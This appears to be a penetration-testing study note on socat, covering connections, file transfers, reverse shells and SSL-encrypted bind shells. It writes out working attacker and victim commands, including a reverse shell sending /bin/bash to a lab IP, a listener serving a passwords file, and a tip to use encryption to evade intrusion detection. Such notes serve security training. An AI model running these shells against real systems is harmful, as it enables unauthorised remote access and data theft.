
Establishes two bidirectional byte streams and transfers data between them.  
  
Syntax is similar to **netcat**, but **socat** requires the **-** to transfer data between STDIO and the remote host (allowing our keyboard interaction with the shell) and protocol (TCP4).  
The protocol, options, and port number are colon-delimited.  
  
```bash
socat - TCP4:<remote ip>:80  
sudo socat TCP4-LISTEN:443 STDOUT
```

Addition of both the protocol for the listener (TCP4-LISTEN) and the STDOUT argument, which redirects standard output, are required.  
  
  
If bind/ reverse bind won't properly execute binaries, verify whether it's a [fully interactive TTY](Fully%20Interactive%20TTY.md):
	Should see:
```bash
tty
	/dev/pts/0
```


**-d** - Verbose  
**EXEC:** - similar to Netcat's **-e**  



###### File transfers:   
Tranfer from:  
```bash
sudo socat TCP4-LISTEN:443,fork file:secret_passwords.txt
```
	Very important! no space after comma  
	◇ **TCP4-LISTEN** - Creates IPv4 listener : port  
	◇ **fork** - Creates a child process once connection is made to the listener allowing for multiple connections  
	◇ **file:** - Specifies name of file to be transferred  
  
Transfer to:  
```bash
socat TCP4:ip_address:443 file:received_secret_passwords.txt,create
```
	Very important! no space after comma  
	◇ **TCP4** - Specifies IPv4 : ip address : port  
	◇ **file** - Specifies local file name to save the file to  
	◇ **create** - Specifies that a new file will be created  
  
  
###### Reverse shells:  
Listener/ Attacker:  
```bash
socat -d -d TCP4-LISTEN:443 STDOUT
```
	**-d -d** for extra verbosity  

Victim:  
```bash
socat TCP4:10.11.0.22:443 EXEC:/bin/bash
```

  

###### Encrypted Bind Shells: 
```bash
openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 362 -out bind_shell.crt  
cat bind_shell.key bind_shell.crt > bind_shell.pem
```
◇ Use [openssl](openssl.md) to create an SSL cert to help evade IDSs.  
◇ Convert the key and cert into a format that **socat** will accept: _.pem_  
  

Listener/ Victim:  
```bash
sudo socat OPENSSL-LISTEN:443,cert=bind_shell.pem,verify=0,fork EXEC:/bin/bash
``` 
	◇ **OPENSSL-LISTEN** - Creates SSL listener : port  
	◇ **cert =** - Specifies cert file  
	◇ **verify** - Disables SSL verification  
	◇ **fork** - Spawn a childproc once connection is made  
  
Attacker:  
```bash
socat - OPENSSL:10.11.0.4:443,verify=0
```
	◇ **-** - Specifies transfer of data from STDIO to remote host  
	◇ **OPENSSL:** - Establishes remote connection to SSL listener : ip address : port  
	◇ **verify=0** - Disables SSL cert verification